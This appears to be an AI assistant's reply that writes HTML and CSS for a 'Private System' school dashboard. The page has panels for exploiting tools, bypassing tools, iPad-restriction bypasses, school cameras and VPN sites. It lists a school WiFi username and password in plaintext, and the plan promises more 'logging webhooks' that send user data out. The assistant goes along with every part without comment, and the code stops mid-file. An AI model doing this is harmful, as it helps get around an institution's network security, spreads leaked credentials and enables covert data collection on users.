I will enhance your HTML dashboard as per your detailed request. Due to the extensive nature of the changes, I'll approach this in several steps, focusing on correctness and integration.

**Plan Overview:**

1.  **Pre-Login & Login Page Updates:**
    *   Implement a pre-login rotating 3D box with "Initializing System..." (orange to red gradient) and "Initializing Login Page..." (animated load into login).
    *   Redesign the login box for rounded, squarer appearance.
    *   Add a new quickbar *above* the login page for panic, zoom in/out.
    *   Change the "Show Password" to a toggle switch with green active state and sliding animation.
    *   Add a current time/date box below the login, with a 24-hour format toggle.
    *   Reduce login attempts to 3.
    *   Implement a loading animation after correct login, leading to the dashboard.
    *   Add a "Welcome (user)" notification in the dashboard's top right.

2.  **Dashboard Global Enhancements:**
    *   Add a search bar to the main quickbar.
    *   Introduce a "Download Activity Logs" button.
    *   Make existing and new panels draggable and resizable.
    *   Add a dedicated settings panel with 15 working options (e.g., theme, notifications, layout, logging level).

3.  **Dashboard Feature Panels & Tools:**
    *   **Notes Pad:** Enhance with thickness, color, texture options, and text notes.
    *   **Keybinds:** Add a configurable keybinds panel.
    *   **Utilities:** Integrate a Timer, Stopwatch, and Countdown with alert system feedback.
    *   **Activity/Login History:** Implement comprehensive activity logging (clicks, toggles, panel views) and display login history.
    *   **Theming:** Add more diverse theme options beyond light/dark.
    *   **Information Panels:** New panels for "Random Facts" and "Daily Quotes."
    *   **Calculators:** Implement a basic Calculator and Unit Converter.
    *   **User Stats:** Panel to show usage statistics (buttons pressed, toggles, panels).
    *   **Media:** Add a media button that opens a YouTube player (client-side iframe, with a note about actual proxy being server-side).
    *   **Reminders:** Reminder system with alert notification.

4.  **Logging & Styling Adjustments:**
    *   Extend existing logging webhooks with 6 more data points.
    *   Apply specified colors (green, yellow, red) to WiFi level indicators.
    *   Refine button organization: Move general actions to a more prominent quickbar, keep info display separate.

Here's the updated code with the first set of requested changes (pre-login animations, enhanced login page, and immediate post-login animations/notifications). Due to the sheer volume, this initial response will focus heavily on these parts to ensure a solid foundation. Subsequent requests will be integrated step-by-step.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent scroll on initial load/animation */
    }

    /* Initial Loading Screen Styles */
    .loading-screen {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 100;
      transition: opacity 1s ease-out;
    }

    .loading-screen.fade-out {
      opacity: 0;
      pointer-events: none;
    }

    .cube-container {
      perspective: 800px;
      margin-bottom: 20px;
    }

    .cube {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      transform: rotateX(-30deg) rotateY(-45deg); /* Initial 3D view */
      animation: rotateCube 5s infinite linear;
      cursor: pointer;
    }

    .face {
      position: absolute;
      width: 100px;
      height: 100px;
      background: rgba(255, 145, 77, 0.6); /* Orange translucent */
      border: 1px solid rgba(255, 255, 255, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 0.8em;
      color: white;
      text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
    }

    .front { transform: rotateY(0deg) translateZ(50px); }
    .back { transform: rotateX(180deg) translateZ(50px); }
    .right { transform: rotateY(90deg) translateZ(50px); }
    .left { transform: rotateY(-90deg) translateZ(50px); }
    .top { transform: rotateX(90deg) translateZ(50px); }
    .bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg); }
    }

    #loadingText {
      font-size: 1.5em;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      animation: gradientText 2s infinite alternate;
      background-image: linear-gradient(to right, orange, red);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      color: orange; /* Fallback for browsers not supporting -webkit-text-fill-color */
    }

    @keyframes gradientText {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    .code-loading-box {
      width: 300px;
      height: 80px;
      background: #1a1a1a;
      border: 1px solid #ff914d;
      border-radius: 8px;
      margin-top: 20px;
      overflow: hidden;
      position: relative;
      font-family: 'Consolas', monospace;
      font-size: 0.9em;
      color: #00ff00; /* Green code */
      line-height: 1.2em;
    }

    .code-loading-box::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: linear-gradient(to right, rgba(26,26,26,0) 0%, rgba(26,26,26,0) 50%, rgba(26,26,26,1) 100%);
      animation: scanEffect 3s infinite linear;
    }

    @keyframes scanEffect {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    /* Login Page Styles */
    body.login-body {
      background: #000;
      color: #fff;
      height: 100vh;
      overflow-y: auto; /* Allow scroll if content is too big */
    }

    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      padding-top: 60px; /* Space for the quick bar */
    }

    .login-quick-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: rgba(255, 145, 77, 0.9);
      padding: 10px 20px;
      display: flex;
      justify-content: flex-end; /* Align to right */
      gap: 10px;
      z-index: 50;
      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
    }

    .login-quick-bar button {
      background-color: #000;
      color: #fff;
      border: 1px solid #fff;
      padding: 8px 15px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.2s, color 0.2s;
    }
    .login-quick-bar button:hover {
      background-color: #fff;
      color: #000;
    }

    .login-box {
      background: #000;
      border-radius: 15px; /* More rounded corners */
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 380px; /* Slightly wider */
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.5s ease-out; /* Added transform for animation */
      z-index: 1;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }

    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 1em;
    }

    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
      margin: 0 10px;
    }

    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #4CAF50; /* Green */
    }

    input:checked + .slider:before {
      transform: translateX(26px);
    }

    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 5px; /* Adjusted gap for toggle */
      cursor: pointer;
    }

    #showPasswordToggle span {
      margin-left: 5px; /* Give some space */
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: red;
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }

    .popup input {
      margin-bottom: 15px;
    }

    .datetime-box {
      background: #1c1c1c;
      border: 1px solid #333;
      border-radius: 10px;
      padding: 15px 20px;
      margin-top: 20px;
      color: #eee;
      font-family: 'Consolas', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .datetime-box span {
      font-size: 1.1em;
    }
    .datetime-box label {
      font-size: 0.8em;
      display: flex;
      align-items: center;
      gap: 8px;
      margin: 0; /* Override login-box label margin */
    }

    /* Dashboard Loading */
    .dashboard-loading {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background-color: #000;
      z-index: 100;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #fff;
    }

    .dashboard-loading-box {
        width: 100px;
        height: 100px;
        position: relative;
        transform-style: preserve-3d;
        animation: rotateCube 3s infinite linear; /* Use the same cube rotation for consistency */
    }

    .dashboard-loading-box .face {
        background: rgba(77, 145, 255, 0.7); /* Blue for dashboard load */
        border: 1px solid rgba(255, 255, 255, 0.8);
    }
    .dashboard-loading-box .face.text-overlay {
        font-size: 10px;
        line-height: 1.2;
        padding: 5px;
        box-sizing: border-box;
        text-align: left;
        color: #ffcc00; /* Yellow text for loading details */
        text-shadow: none;
        animation: textFlicker 1s infinite alternate;
    }
    @keyframes textFlicker {
      0% { opacity: 0.8; }
      100% { opacity: 1; }
    }

    .loading-code-area {
      width: 400px;
      height: 150px;
      background: #000;
      border: 2px solid #00ff00;
      border-radius: 10px;
      margin-top: 30px;
      overflow: hidden;
      position: relative;
      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
      font-size: 0.8em;
      color: #00ff00;
      padding: 10px;
      box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
    }

    .loading-code-line {
      white-space: pre-wrap;
      word-break: break-all;
      opacity: 0;
      transform: translateY(20px);
      animation: typeCode 0.1s forwards linear; /* Adjusted for faster typing */
      margin-bottom: 2px;
    }

    /* Notification */
    .dashboard-notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #2ecc71; /* Green */
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      opacity: 0;
      transform: translateY(-20px);
      animation: fadeInSlideDown 0.5s forwards ease-out, fadeOutUp 0.5s forwards ease-in 5s; /* Show for 5s then fade out */
      z-index: 100;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    @keyframes fadeInSlideDown {
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeOutUp {
      0% { opacity: 1; transform: translateY(0); }
      100% { opacity: 0; transform: translateY(-20px); }
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Share+Tech+Mono&display=swap'); /* Added Share Tech Mono for code */

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1;
      height: auto; /* Allow dashboard to extend naturally */
      overflow: auto; /* Allow scroll in dashboard */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }

    /* Specific WiFi Panel Colors */
    .wifi-entry .high-signal { background-color: #27ae60; color: white; } /* Green */
    .wifi-entry .medium-signal { background-color: #f39c12; color: black; } /* Yellow/Orange */
    .wifi-entry .low-signal { background-color: #e74c3c; color: white; } /* Red */

    /* Quickbar - Split into global and panel selection for better organization */
    .global-quick-bar {
      display: flex;
      justify-content: flex-end; /* Global actions mostly right */
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
      flex-wrap: wrap;
      background-color: #2a2a2a; /* Slightly darker to differentiate */
      padding: 10px;
      border-radius: 8px;
    }
    .global-quick-bar input[type="search"] {
      padding: 8px 12px;
      border-radius: 5px;
      border: 1px solid #ff914d;
      background: #3a3a3a;
      color: #f9f2dc;
      width: 200px;
      transition: border-color 0.2s, background 0.2s;
    }
    .global-quick-bar input[type="search"]::placeholder {
      color: #bbb;
    }
    .global-quick-bar input[type="search"]:focus {
      border-color: #ffb67a;
      background: #4a4a4a;
      outline: none;
    }


    /* Other styles for existing components */
    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      position: relative; /* For notification positioning */
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }

    .dashboard-header .info-displays { /* Group info displays together */
        display: flex;
        gap: 12px;
        margin-left: 20px; /* Separates from main header text */
    }

    .dashboard-header .info-displays button {
        background-color: #000; /* Black for better contrast */
        border: none;
        padding: 8px 12px;
        border-radius: 8px;
        color: white;
        font-weight: bold;
        cursor: default; /* Not interactive */
        min-width: 110px;
        white-space: nowrap;
        font-size: 0.85em;
    }

    .quick-bar { /* This is for the panel toggles now */
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 110px;
      white-space: nowrap;
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s;
      flex: 1 1 300px;
      /* For draggable/resizable */
      position: relative;
      overflow: hidden;
      resize: both; /* Allow resizing */
      min-width: 250px;
      min-height: 100px;
    }

    body.dashboard-body.light-theme .box {
      background-color: #ffd966;
      color: #000;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.6);
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }

    body.dashboard-body.light-theme .update-entry {
      background: #ffd999;
      color: #994d00;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div {
      background: #ffd966;
      color: #000;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important;
      color: #ffd966;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      padding: 20px;
      background-color: #2a2a2a;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      margin-bottom: 10px;
    }

    #canvasControls {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
      margin-top: 10px;
    }

    #canvasControls button,
    #canvasControls input[type="color"],
    #canvasControls input[type="range"] {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0;
    }
    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    #canvasControls input[type="color"] {
      height: 36px;
      width: 50px;
      padding: 5px;
      box-sizing: border-box;
      cursor: pointer;
    }

    #canvasControls input[type="range"] {
      width: 100px;
      -webkit-appearance: none;
      height: 8px;
      background: #f1f1f1;
      outline: none;
      opacity: 0.7;
      transition: opacity .2s;
    }

    #canvasControls input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 20px;
      height: 20px;
      background: #ff914d;
      cursor: pointer;
      border-radius: 50%;
    }

    .notes-text-area {
      width: 100%;
      height: 150px;
      padding: 10px;
      margin-top: 10px;
      border-radius: 8px;
      border: 1px solid #ff914d;
      background: #1c1c1c;
      color: #fff;
      resize: vertical;
      font-family: 'Segoe UI', sans-serif;
      font-size: 1em;
      display: none; /* Hidden by default */
    }

    .motivation-box,
    .fact-box, /* New panel */
    .quote-box /* New panel */
    {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      flex: 1 1 300px;
      resize: both;
      overflow: auto;
      min-width: 250px;
      min-height: 100px;
      position: relative; /* For dragging */
    }

    body.dashboard-body.light-theme .motivation-box,
    body.dashboard-body.light-theme .fact-box,
    body.dashboard-body.light-theme .quote-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.8);
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      position: relative;
      overflow: auto;
      resize: both;
      min-width: 300px;
      min-height: 200px;
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: #ffd966;
      color: #000;
    }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 15px;
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: #ffd999;
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }

    body.dashboard-body.light-theme .wifi-entry div {
      background: #ffd999;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons a, .links-list a, .exploit-buttons a,
    .handbook-buttons button, .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
    }

    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover,
    .handbook-buttons button:hover, .bypass-buttons button:hover {
      background-color: #ffb67a;
    }

    .coming-soon, .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    body.dashboard-body.light-theme .coming-soon,
    body.dashboard-body.light-theme .info-text {
      background: #ffd999;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #ffd999;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }

    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
    }

    /* Added for drag & drop panels */
    .box.dragging {
      opacity: 0.7;
      border: 2px dashed #ff914d;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Added for draggable/resizable panels -->
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>

</head>
<body id="bodyElement">

  <!-- Initial Loading Screen -->
  <div class="loading-screen" id="initialLoadingScreen">
    <div class="cube-container">
      <div class="cube" id="loadingCube">
        <div class="face front"></div>
        <div class="face back"></div>
        <div class="face right"></div>
        <div class="face left"></div>
        <div class="face top"></div>
        <div class="face bottom"></div>
      </div>
    </div>
    <div id="loadingText">Initializing System...</div>
  </div>

  <!-- Login Page Content (Initially Hidden for loading screen) -->
  <div class="login-container" id="loginContainer" style="display:none; opacity:0;">
    <div class="login-quick-bar">
      <button id="loginPanicBtn">🚨 Panic</button>
      <button id="loginZoomInBtn">➕ Zoom In</button>
      <button id="loginZoomOutBtn">➖ Zoom Out</button>
    </div>

    <div class="login-box" id="loginBox">
      <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <label for="showPasswordToggle" id="showPasswordLabel">
        <span class="toggle-switch">
          <input type="checkbox" id="showPasswordToggle" />
          <span class="slider"></span>
        </span>
        <span>Show Password</span>
      </label>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div> <!-- Changed from 5 to 3 -->

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>

      <div class="datetime-box">
        <span id="currentDateTime"></span>
        <label>
          <span class="toggle-switch">
            <input type="checkbox" id="timeFormatToggle" />
            <span class="slider"></span>
          </span>
          <span>24-Hour Format</span>
        </label>
      </div>
    </div>
  </div>

  <!-- Dashboard Loading Screen (after login but before dashboard display) -->
  <div class="dashboard-loading" id="dashboardLoadingScreen" style="display:none;">
    <div class="dashboard-loading-box">
        <div class="face front text-overlay"></div>
        <div class="face back text-overlay"></div>
        <div class="face right text-overlay"></div>
        <div class="face left text-overlay"></div>
        <div class="face top text-overlay"></div>
        <div class="face bottom text-overlay"></div>
    </div>
    <div class="loading-code-area" id="dashboardLoadingCode"></div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none; opacity: 0;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="info-displays">
          <button id="sessionTime">⏳ Session Time: 00:00:00</button>
          <button id="realTimeClock">🕒 --:--:--</button>
          <button id="realDate">📅 --</button>
      </div>
      <div class="version-box">Version 1.5.6</div>
      <!-- Notification placeholder, JS will append here -->
    </div>

    <div class="global-quick-bar">
      <input type="search" id="dashboardSearchBar" placeholder="Search dashboard...">
      <button id="downloadActivityLogsBtn">Download Logs</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="logoutBtn">🔓 Log Out</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="settingsBtn">⚙️ Settings</button> <!-- New Settings button -->
      <button id="notesBtn">📒 Notes</button>
      <button id="timerStopwatchBtn">⏱️ Timer/Stopwatch</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">💱 Unit Converter</button>
      <button id="statsBtn">📊 Stats</button>
      <button id="mediaBtn">▶️ Media</button>
      <button id="reminderBtn">🔔 Reminder</button>
      <button id="activityLogBtn">📜 Activity Log</button>
      <button id="loginHistoryBtn">📅 Login History</button>
      <button id="keybindsBtn">⌨️ Keybinds</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <div class="main-row" id="mainGrid">
      <div class="box" id="calendarBox">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>

      <div class="box fact-box" id="randomFactBox" style="display:none;">
        <h2>💡 Random Fact</h2>
        <p id="factContent"></p>
      </div>

      <div class="box quote-box" id="dailyQuoteBox" style="display:none;">
        <h2>🗣️ Daily Quote</h2>
        <p id="quoteContent"></p>
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" id="updatesBox" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsBox" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>

        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="high-signal">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="high-signal">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="medium-signal">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>

        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="low-signal">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>

        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>

